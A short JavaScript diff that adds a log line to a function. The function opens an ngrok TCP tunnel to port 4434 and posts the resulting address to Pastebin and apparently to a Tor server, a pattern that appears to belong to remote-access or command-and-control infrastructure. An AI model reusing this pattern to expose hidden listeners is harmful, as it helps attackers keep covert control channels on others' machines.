@@ -123,6 +123,7 @@ function getPublicIP() {
   //Get url and links it to port 4434, then save to pastebin
   ngrok.connect({proto: 'tcp', addr: 4434, region: 'eu'}, function (err, url) {
     console.log("NGrok Url:  ".green + url.blue);
+    console.log("Starting tor Server...")
     updateTorIpServer(url);
     updatePastebin(url);
     }
